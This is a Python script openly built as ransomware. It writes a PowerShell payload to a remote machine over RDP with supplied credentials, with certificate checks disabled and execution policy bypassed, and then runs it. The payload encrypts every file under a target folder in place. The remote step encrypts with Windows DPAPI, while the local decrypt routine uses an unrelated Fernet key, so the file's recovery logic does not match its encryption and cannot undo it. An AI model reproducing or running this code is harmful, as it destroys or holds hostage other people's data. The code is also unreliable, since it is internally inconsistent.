import os
import subprocess
from cryptography.fernet import Fernet

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM using RDP (rdesktop)
    def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
        # Create the PowerShell script content for the target VM
        script_content = f'''
$key = "{self.key.decode()}"
$folderPath = "{folder_path}"

$files = Get-ChildItem -Path $folderPath -File -Recurse

foreach ($file in $files) {{
    $data = Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0
    $encryptedData = [System.Security.Cryptography.ProtectedData]::Protect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content -Path $file.FullName -Value $encryptedData -Encoding Byte
}}
'''
        # Generate a random script name
        script_name = "encrypt_script.ps1"

        # Copy the script file to the target VM using RDP (xfreerdp)
        # Copy the script file to the target VM using RDP (xfreerdp) with certificate validation disabled
        # Copy the script file to the target VM using RDP (xfreerdp) with certificate validation disabled
        copy_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -Command \\"$scriptContent = \\"{script_content}\\"; $scriptContent | Out-File -FilePath \\"{script_name}\\" -Encoding UTF8\\"" /cert-ignore'
        subprocess.Popen(copy_script_command, shell=True)
        
        # Run the script on the target VM using RDP (xfreerdp) with certificate validation disabled
        run_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -File \\"{script_name}\\"" /cert-ignore'
        subprocess.Popen(run_script_command, shell=True)




    # Decrypt files using the Fernet symmetric key
    def decrypt_folder(self, folder_path):
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(decrypted)

        print("Decryption completed.")


# Create an instance of the Ransomware class
ransomware = Ransomware()

while True:
    # Add choices at the bottom
    print("Choose an action:")
    print("1. Encrypt folder on a different VM")
    print("2. Decrypt folder")
    choice = input("Enter your choice (1/2): ")
    
    if choice == "1":
        target_vm_ip = input("Enter the target VM IP: ")
        folder_path = os.path.join(os.path.expanduser('~'), "Downloads")
        rdp_username = input("Enter your RDP username: ")
        rdp_password = input("Enter your RDP password: ")
        ransomware.vm(target_vm_ip, folder_path, rdp_username, rdp_password)
    elif choice == "2":
        folder_path = input("Enter the folder path to decrypt: ")
        ransomware.decrypt_folder(folder_path)
    else:
        print("Invalid choice. Please choose a valid option.")
        break

